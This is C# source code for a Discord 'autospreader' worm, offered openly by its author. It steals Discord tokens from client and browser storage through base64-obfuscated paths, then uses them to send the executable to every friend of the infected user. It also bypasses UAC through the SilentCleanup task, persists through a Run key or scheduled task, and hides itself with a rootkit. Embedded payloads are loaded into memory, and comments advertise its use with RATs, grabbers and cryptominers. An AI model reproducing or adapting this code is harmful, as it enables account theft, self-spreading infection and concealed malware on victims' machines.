using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web.Script.Serialization;

namespace project_discord_spreader
{
    class Program
    {
        public static string message_to_malware_analysts = @"HELLO! im moom825 (not who ever is distributing this), I created this message to help malware analysts or whoever opened up dnspy/ilspy to look at this. 
So lets get started, the class named settings is all the settings for this built exe. the only thing obfuscated in this are browser names(found in GetThem()), well unless someone else obfuscated this. Did i mention this tool is open source?
heres the source: https://github.com/moom825/discord-autospreader . You should be able to look at the source and understand whats going on. well, have a great rest of your day!";
        public static bool admin = WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        public static bool dostartup = Convert.ToBoolean(settings.dostartup);
        public static bool copytoappdata = Convert.ToBoolean(settings.copytoappdata);
        public static bool douacbypass = Convert.ToBoolean(settings.douacbypass);
        public static bool ifuacbypasslaunchprompt = Convert.ToBoolean(settings.ifuacbypasslaunchprompt);
        public static bool uacpromptforever = Convert.ToBoolean(settings.uacpromptforever);
        public static bool dorootkit = Convert.ToBoolean(settings.dorootkit);
        public static bool dospread = Convert.ToBoolean(settings.dospread);
        public static string spreadmessage = settings.spreadmessage;
        public static string spreadfilename = settings.spreadfilename;
        public static bool spreadfile = Convert.ToBoolean(settings.spreadfile);
        public static bool dopayload = Convert.ToBoolean(settings.dopayload);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);
        
        private static List<string> GetThem()
        {
            string appdata = @"XEFwcERhdGE=";
            string user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string locallevel = "XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==";
            string[] paths = new string[] { "XFJvYW1pbmdcZGlzY29yZA==", "XFJvYW1pbmdcZGlzY29yZHB0Yg==", "XFJvYW1pbmdcZGlzY29yZGNhbmFyeQ==", "XFJvYW1pbmdcZGlzY29yZGRldmVsb3BtZW50", "XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxl", "XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl",
            "XExvY2FsXEFtaWdvXFVzZXIgRGF0YQ==","XExvY2FsXFRvcmNoXFVzZXIgRGF0YQ==", "XExvY2FsXEtvbWV0YVxVc2VyIERhdGE=", "XExvY2FsXE9yYml0dW1cVXNlciBEYXRh","XExvY2FsXENlbnRCcm93c2VyXFVzZXIgRGF0YQ==", "XExvY2FsXDdTdGFyXDdTdGFyXFVzZXIgRGF0YQ==",
            "XExvY2FsXFNwdXRuaWtcU3B1dG5pa1xVc2VyIERhdGE=", "XExvY2FsXFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHQ=", "XExvY2FsXEdvb2dsZVxDaHJvbWUgU3hTXFVzZXIgRGF0YQ==", "XExvY2FsXEVwaWMgUHJpdmFjeSBCcm93c2VyXFVzZXIgRGF0YQ==", "XExvY2FsXHVDb3pNZWRpYVxVcmFuXFVzZXIgRGF0YVxEZWZhdWx0"
            , "XExvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0", "XExvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0", "XExvY2FsXE9wZXJhIFNvZnR3YXJlXE9wZXJhIE5lb25cVXNlciBEYXRhXERlZmF1bHQ=", "XExvY2FsXEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdA=="};
            List<string> discordTokens = new List<string>();
            List<DirectoryInfo> rootFolders = new List<DirectoryInfo>();
            //{
                //OBFUSCATE THESE STRINGS | done(thats what the base64 is)^
                /*
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discord\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordptb\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordcanary\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discorddevelopment\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"),e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Amigo\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Torch\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Kometa\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Orbitum\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\CentBrowser\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\7Star\7Star\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Vivaldi\User Data\Default\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Epic Privacy Browser\User Data\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb"), e
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb") e*/
            //};
            foreach (string i in paths) 
            {
                string hope = user;
                hope += Encoding.UTF8.GetString(Convert.FromBase64String(appdata));
                hope += Encoding.UTF8.GetString(Convert.FromBase64String(i));
                hope += Encoding.UTF8.GetString(Convert.FromBase64String(locallevel));
                rootFolders.Add(new DirectoryInfo(hope));
            }
            foreach (var rootFolder in rootFolders)
            {
                try
                {
                    foreach (var file in rootFolder.GetFiles("*.ldb"))
                    {
                        string readFile = file.OpenText().ReadToEnd();

                        foreach (Match match in Regex.Matches(readFile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            discordTokens.Add(match.Value);

                        foreach (Match match in Regex.Matches(readFile, @"mfa\.[\w-]{84}"))
                            discordTokens.Add(match.Value);
                    }
                }
                catch { continue; }
            }
            discordTokens = discordTokens.Distinct().ToList();
            return discordTokens;
        }
        public static List<int> AllIndexesOf(string str, string value)
        {
            if (String.IsNullOrEmpty(value))
                throw new ArgumentException("the string to find may not be empty", "value");
            List<int> indexes = new List<int>();
            for (int index = 0; ; index += value.Length)
            {
                index = str.IndexOf(value, index);
                if (index == -1)
                    return indexes;
                indexes.Add(index);
            }
        }
        public static void startspreading(string message, byte[] file, bool isfile, string filename) 
        {
            List<string> tokens1 = GetThem();
            //tokens1 = new List<string> {"testing token" }; // remove this line when done!
            foreach (string tokens in tokens1)
            {
                try
                {
                    List<string> ids = new List<string>();
                    using (var client = new WebClient())
                    {
                        client.Headers.Add("authorization", tokens);
                        string e = client.DownloadString("https://discord.com/api/v9/users/@me/relationships");
                        List<int> b = AllIndexesOf(e, "\"id\":");
                        foreach (int i in b)
                        {
                            string h = String.Join("", String.Join("", e.Reverse()).Substring(e.Length - (i + 26)).Reverse()).Substring(i).Substring(6).Trim('"');
                            ids.Add(h);
                        }
                        client.Dispose();
                    }
                    ids = ids.Distinct().ToList();
                    List<string> properid = new List<string>();
                    foreach (string i in ids)
                    {
                        var httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me/channels");
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Method = "POST";
                        httpWebRequest.Headers.Add("authorization", tokens);
                        using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                        {
                            string json = new JavaScriptSerializer().Serialize(new
                            {
                                recipients = new string[] { i }
                            });

                            streamWriter.Write(json);
                        }
                        var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                        using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                        {
                            var result = streamReader.ReadToEnd();
                            var serializer = new JavaScriptSerializer();
                            dynamic jsonresult = serializer.DeserializeObject(result);
                            properid.Add(jsonresult["id"]);
                        }
                    }
                    foreach (string i in properid)
                    {
                        HttpClient httpClient = new HttpClient();
                        MultipartFormDataContent form = new MultipartFormDataContent();
                        httpClient.DefaultRequestHeaders.Add("authorization", tokens);
                        form.Add(new StringContent(message), "content");
                        if (isfile)
                        {
                            form.Add(new ByteArrayContent(file, 0, file.Length), "files[0]", filename);
                        }
                        HttpResponseMessage response = httpClient.PostAsync("https://discord.com/api/v9/channels/" + i + "/messages", form).Result;
                        response.EnsureSuccessStatusCode();
                        httpClient.Dispose();
                    }
                }
                catch
                {
                    continue;
                }
            }
        }
        static byte[] GetEmbeddedResource(string resourceName)
        {
            var self = Assembly.GetExecutingAssembly();

            using (var rs = self.GetManifestResourceStream(resourceName))
            {
                if (rs != null)
                {
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
                else
                {
                    return null;
                }
            }
        }
        public static void startrootkit() 
        {
            payloadandrootkitloader(true);
        }
        public static void rootkitaddpid(int pid) 
        {
            RegistryKey rk = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\$77config\pid");
            rk.SetValue(Path.GetRandomFileName(), pid, RegistryValueKind.DWord);
            rk.Close();
        }
        public static void rootkitaddpath(string path) 
        {
            RegistryKey rk = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\$77config\paths");
            rk.SetValue(Path.GetRandomFileName(), path, RegistryValueKind.String);
            rk.Close();
        }

        public static void payloadandrootkitloader(bool startrootkitonly)
        {
            var resourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
            List<byte[]> e = new List<byte[]>();
            foreach (string resourceName in resourceNames)
            {
                if (resourceName.Contains("rootkit"))
                {
                    if (startrootkitonly) 
                    {
                        byte[] temp = GetEmbeddedResource(resourceName);
                        e.Add(temp);
                        break;
                    }
                    continue;
                }
                if (!startrootkitonly)
                {
                    byte[] nice = GetEmbeddedResource(resourceName);
                    e.Add(nice);
                }
            }
            foreach (byte[] c in e) 
            {

                try
                {
                    Assembly a = Assembly.Load(c);
                    MethodInfo m = a.EntryPoint;
                    try
                    {
                        var parameters = m.GetParameters().Length == 0 ? null : new[] { new string[0] };
                        m.Invoke(null, parameters);
                    }
                    catch
                    {
                        try
                        {
                            object o = a.CreateInstance(m.Name);
                            m.Invoke(o, null);
                        }
                        catch
                        {
                            string path = Path.Combine(new string[] { System.IO.Path.GetTempPath(), Path.GetRandomFileName() + ".exe" });
                            File.WriteAllBytes(path, c);
                            var p = new Process();
                            p.StartInfo.FileName = path;
                            p.Start();
                            if (dorootkit && admin)
                            {
                                rootkitaddpid(p.Id);
                                rootkitaddpath(path);
                            }
                        }
                    }
                }
                catch 
                {
                    string path = Path.Combine(new string[] { System.IO.Path.GetTempPath(), Path.GetRandomFileName() + ".exe" });
                    File.WriteAllBytes(path, c);
                    var p = new Process();
                    p.StartInfo.FileName = path;
                    p.Start();
                    if (dorootkit && admin) 
                    {
                        rootkitaddpid(p.Id);
                        rootkitaddpath(path);
                    }
                    
                }
            }
        }
        public static void uacbypass(string path) 
        {
            RegistryKey rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\didirun");
            rk.SetValue("didi", "yes", RegistryValueKind.String);
            Environment.SetEnvironmentVariable("windir",'"'+ path +'"' +" ;#", EnvironmentVariableTarget.User);
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "SCHTASKS.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = @"/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
                }
            };
            p.Start();
            Thread.Sleep(500);
            Environment.SetEnvironmentVariable("windir", Environment.GetEnvironmentVariable("systemdrive") + "\\Windows", EnvironmentVariableTarget.User);
        }
        public static void addstartupnonadmin() 
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("$77"+ Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location), System.Reflection.Assembly.GetEntryAssembly().Location);
        }
        public static void addstartupadmin() 
        {
            string xmlpath = $"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\\temp.xml";
            File.WriteAllText(xmlpath,
@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>" + Assembly.GetEntryAssembly().Location + @"</Command>
    </Exec>
  </Actions>
</Task>");
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = $"schtasks /create /tn \"$77{Path.GetFileName(Assembly.GetEntryAssembly().Location)}\" /xml {xmlpath}",
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false

            }).WaitForExit();
            File.Delete(xmlpath);
        }
        public static void copyappdata() 
        {
            try
            {
                if (Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                {
                    string endloc = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Path.GetRandomFileName() + ".exe");
                    if (File.Exists(endloc))
                    {
                        try { File.Delete(endloc); } catch { return; }
                    }
                    File.Copy(Assembly.GetExecutingAssembly().Location, endloc);
                    Process.Start(endloc);
                    System.Environment.Exit(0);
                }
            }
            catch { return; }
        }
        static void Main(string[] args)
        {
            // NEW ISSUE, FIX: add options to build into either 32 bit or 64 bit. rootkit doesnt NOT work in 32 bit! and it can not be any-cpu option. MUST BE 64 BIT FOR ROOTKIT! | DONE!
            // you know what, fuck it. fuck 32 bit, its dying off anyways. build for 64 bit ONLY! | DONE!
            //todo | ALL DONE!
            //copy self to appdata | DONE!
            //add reflection loading(if failed drop to disk and run) | DONE!
            //add rootkit | DONE!
            //add to startup | DONE!
            //add uac-bypass | DONE!
            //old description i made
            /*
            This tool is an auto spreader, meaning once you infect someone it will look through their discord, grab their friends and message them with the virus they first got infected with, and the process repeats with new person infected. 
            This tool will hide itself from the file system and task-manager(as well as other process managers) via a rootkit. 
            This tool will also add it self to startup so when the computer start, the file starts. 
            It also has a built in uac-bypass(meaning is will get admin without prompting for admin).
            And finally it can also load your file into memory(meaning it does not need to touch the filesystem but instead run as a subprocess), and if your file is not combatible with memory injection it will drop it to disk and run it. 
            this tool supports:
            -grabers
            -rats
            -crypto miners(good choice for this because the rootkit will hide the cpu percentage and process)
            -many others!
             */

            IntPtr wow64Value = IntPtr.Zero;
            if (Environment.Is64BitOperatingSystem == true)
            {
                Wow64DisableWow64FsRedirection(ref wow64Value);
            }
            if (copytoappdata) 
            {
                copyappdata();
            }
            //((Action)(() => { }))(); // fucking love this line!
            if (!admin && douacbypass)
            {
                var rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\didirun");
                string value = "";
                if (rk == null) { value = "no"; } else { value = (string)rk.GetValue("didi"); }
                if (value == "yes")
                {
                    if (ifuacbypasslaunchprompt)
                    { 

                        ProcessStartInfo info = new ProcessStartInfo(System.Reflection.Assembly.GetEntryAssembly().Location);
                        info.UseShellExecute = true;
                        info.Verb = "runas";
                        while (true)
                        {
                            try
                            {
                                var e = Process.Start(info);
                                System.Environment.Exit(0);
                            }
                            catch {  }
                            if (!uacpromptforever) { break; }
                            
                        }
                    }
                    try
                    {
                        Registry.CurrentUser.DeleteSubKey("SOFTWARE\\didirun");
                    }
                    catch{}
                    if (dostartup) 
                    {
                        if (admin) { addstartupadmin(); } else { addstartupnonadmin();  }
                    }
                    if (dopayload) payloadandrootkitloader(false);
                    if (dospread) startspreading(spreadmessage, File.ReadAllBytes(System.Reflection.Assembly.GetEntryAssembly().Location), spreadfile, spreadfilename);
                }
                else 
                {
                    uacbypass(System.Reflection.Assembly.GetEntryAssembly().Location);
                }
            }
            else 
            {
                if (admin && dorootkit) 
                {
                    rootkitaddpid(Process.GetCurrentProcess().Id);
                    string e = System.Reflection.Assembly.GetEntryAssembly().Location;
                    rootkitaddpath(e);
                    startrootkit();
                    if (dostartup)
                    {
                        addstartupadmin();
                    }
                }
                try
                {
                    Registry.CurrentUser.DeleteSubKey("SOFTWARE\\didirun");
                }catch{ }
                if (dostartup)
                {
                    if (admin) { addstartupadmin(); } else { addstartupnonadmin(); }
                }
                if (dopayload)payloadandrootkitloader(false);
                if (dospread) startspreading(spreadmessage, File.ReadAllBytes(System.Reflection.Assembly.GetEntryAssembly().Location), spreadfile, spreadfilename);
            }

        }
    }
}
